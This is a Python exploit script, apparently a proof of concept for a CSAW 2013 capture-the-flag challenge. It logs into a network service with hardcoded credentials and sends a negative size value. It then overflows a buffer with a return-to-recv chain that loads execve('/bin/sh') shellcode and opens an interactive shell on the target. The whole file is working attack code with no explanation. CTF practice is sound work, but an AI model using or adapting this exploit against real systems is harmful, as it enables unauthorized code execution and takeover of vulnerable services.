#!/usr/bin/python

# PoC of challenge

import socket
import sys
import time
import telnetlib 
from struct import *
from socket import *

HOST = '0.0.0.0'    # The remote host
PORT = 8000        # The same port as used by the server
s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

print("+ Got Connection!")

buf = s.recv(1024) #banner

s.send("csaw2013\n")
print("+ Sending Username!")
buf = s.recv(1024)
s.send("S1mplePWD\n")
print("+ Sending pwd!")
buf = s.recv(1024) #welcome

print("+ Authenticated!")
buf = s.recv(1024) # Entry Info


#string
val = "-1"

print("+ Sending size")

s.send(val)

# Return 2 libc 
# recv address
# recv's ret address - address to where shellcode is
# param1
# param2
# param3
# param4
# shellcode

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

recv_adr = pack("<I", 0x8048890)
recv_ret = pack("<I", 0x804b008)
param1 = pack("<I", 4)
param2 = recv_ret
slen = len(shellcode)+1
param3 = pack("<I", slen)
param4 = pack("<I", 0)

attack = recv_adr + recv_ret + param1 + param2 + param3 + param4 

pwn = "A" * 1056 + attack + "\n"

print("Sending pwn string")
s.send(pwn)

time.sleep(1)
s.send(shellcode)

tc = telnetlib.Telnet()                                                            
tc.sock = s                                                                        
tc.interact() 


#pwn
